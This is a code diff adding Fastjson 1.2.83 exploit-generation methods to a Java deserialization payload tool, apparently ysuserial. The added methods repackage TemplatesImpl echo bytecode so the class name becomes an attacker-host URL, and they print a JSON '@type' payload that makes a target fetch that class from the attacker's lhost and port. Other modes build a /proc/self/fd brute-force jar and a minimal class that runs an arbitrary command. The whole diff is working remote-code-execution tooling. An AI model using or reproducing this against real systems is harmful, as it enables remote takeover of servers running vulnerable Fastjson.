@@ -232,6 +232,115 @@ public class GlassHandler {
 		insertField(templateClass, "CLASS_MODIFIER_BYTES", "public static String CLASS_MODIFIER_BYTES = \"" + base64Encode(classModifier.toBytecode()) + "\";");
 	}
 
+	// ========== Fastjson 1.2.83 getResourceAsStream 导出 ==========
+
+	/**
+	 * 从 Fastjson1 TemplatesImpl payload 中提取 echo 类字节码，
+	 * 添加 @JSONType(asm=false) 注解，改名为 URL 格式，输出 .class 文件。
+	 *
+	 * 支持两种模式：
+	 *   jdk8-http: 输出单个 .class 文件（类名 = URL 格式）
+	 *   fd:        输出 probe.jar（含 253 个类），通过 /proc/self/fd/N 爆破
+	 */
+	public static String exportForFastjson83(Object payload, String lhost, int lport,
+	                                         String className, String outputPath) throws Exception {
+		// 提取 TemplatesImpl._bytecodes[0]
+		byte[] echoBytes = extractTemplatesBytecode(payload);
+
+		// 根据模式选择策略
+		if ("fd".equals(FASTJSON_83_MODE_TYPE)) {
+			return exportForFastjson83FdFromTemplate(echoBytes, lhost, lport, className, outputPath);
+		} else {
+			return exportForFastjson83Jdk8HttpFromTemplate(echoBytes, lhost, lport, className, outputPath);
+		}
+	}
+
+	/**
+	 * jdk8-http 模式：从 TemplatesImpl 字节码导出单个 .class 文件
+	 *
+	 * 流程：原字节码 → Javassist 加 @JSONType(asm=false) → Spring ASM 改类名 → 写文件
+	 */
+	public static String exportForFastjson83Jdk8HttpFromTemplate(byte[] echoBytes, String lhost,
+	                                                              int lport, String className,
+	                                                              String outputPath) throws Exception {
+		// 用 Spring ASM 一次性完成：改类名 + 加 @JSONType(asm=false) + 升 Java 8
+		String payloadHost = org.su18.ysuserial.payloads.util.Fastjson83Util.toPayloadHost(lhost);
+		String newInternalName = "http://" + payloadHost + ":" + lport + "/" + className;
+
+		byte[] finalBytes = org.su18.ysuserial.payloads.util.Fastjson83Util
+				.repackageClass(echoBytes, newInternalName, true);
+
+		// 写文件
+		java.io.File outFile = new java.io.File(outputPath);
+		if (outFile.getParentFile() != null) {
+			outFile.getParentFile().mkdirs();
+		}
+		java.nio.file.Files.write(outFile.toPath(), finalBytes);
+
+		System.err.println("[+] Fastjson 1.2.83 jdk8-http class → " + outFile.getAbsolutePath());
+		System.err.println("[+] JSON payload:");
+		System.err.println("    {\"@type\":\"http:.." + payloadHost + ":" + lport + "." + className + "\"}");
+
+		return outFile.getAbsolutePath();
+	}
+
+	/**
+	 * fd 模式：从 TemplatesImpl 字节码生成 probe.jar
+	 */
+	public static String exportForFastjson83FdFromTemplate(byte[] echoBytes, String lhost,
+	                                                        int lport, String className,
+	                                                        String outputPath) throws Exception {
+		String tag = FASTJSON_83_TAG;
+		int maxFd = FASTJSON_83_MAX_FD;
+		String wwwDir = FASTJSON_83_WWW_DIR;
+
+		// 如果没有指定 www 目录，使用 outputPath 的父目录
+		if (wwwDir == null || wwwDir.isEmpty()) {
+			java.io.File outFile = new java.io.File(outputPath);
+			wwwDir = outFile.getParent();
+			if (wwwDir == null) wwwDir = ".";
+		}
+
+		return org.su18.ysuserial.payloads.util.Fastjson83Util
+				.generateFdModeFromTemplate(echoBytes, lhost, lport, tag, maxFd, wwwDir);
+	}
+
+	/**
+	 * 使用最小化 class 直接生成（不使用 TemplatesImpl 模板）
+	 * 适用于简单 RCE 场景，生成的 class 极小（约 800 bytes）
+	 */
+	public static String exportForFastjson83Minimal(String lhost, int lport, String className,
+	                                                 String cmd, String outputPath) throws Exception {
+		if ("fd".equals(FASTJSON_83_MODE_TYPE)) {
+			String tag = FASTJSON_83_TAG;
+			int maxFd = FASTJSON_83_MAX_FD;
+			String wwwDir = FASTJSON_83_WWW_DIR;
+			if (wwwDir == null || wwwDir.isEmpty()) {
+				java.io.File outFile = new java.io.File(outputPath);
+				wwwDir = outFile.getParent();
+				if (wwwDir == null) wwwDir = ".";
+			}
+			return org.su18.ysuserial.payloads.util.Fastjson83Util
+					.generateFdMode(lhost, lport, tag, cmd, maxFd, wwwDir);
+		} else {
+			return org.su18.ysuserial.payloads.util.Fastjson83Util
+					.generateJdk8Http(lhost, lport, className, cmd, outputPath);
+		}
+	}
+
+	/**
+	 * 从 Fastjson1.getObject() 返回的 HashMap 中提取 TemplatesImpl._bytecodes[0]
+	 */
+	private static byte[] extractTemplatesBytecode(Object payload) throws Exception {
+		java.util.HashMap hashMap = (java.util.HashMap) payload;
+		// HashMap 只有一个 key (TemplatesImpl)
+		Object templates = hashMap.keySet().iterator().next();
+		java.lang.reflect.Field f = templates.getClass().getDeclaredField("_bytecodes");
+		f.setAccessible(true);
+		byte[][] bytecodes = (byte[][]) f.get(templates);
+		return bytecodes[0];
+	}
+
 	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
 	public static void shrinkBytes(CtClass ctClass) {
 		ClassFile classFile = ctClass.getClassFile2();
